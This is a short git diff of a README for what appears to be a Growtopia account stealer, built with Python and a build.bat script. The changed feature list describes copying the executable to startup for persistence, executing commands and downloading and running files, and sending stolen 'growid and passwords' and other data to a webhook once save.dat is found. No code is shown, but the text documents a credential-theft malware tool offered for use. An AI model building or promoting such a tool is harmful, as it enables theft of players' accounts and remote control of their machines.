@@ -5,7 +5,7 @@ Install python and run build.bat
 * copy executable to startup
 * execute command (optional)
 * download file and run (optional)
-* get useful informations and send to webhook
+* get useful informations and send to webhook when find save.dat
 * send growid and passwords (1 password is always correct)
 * check for new logins
 
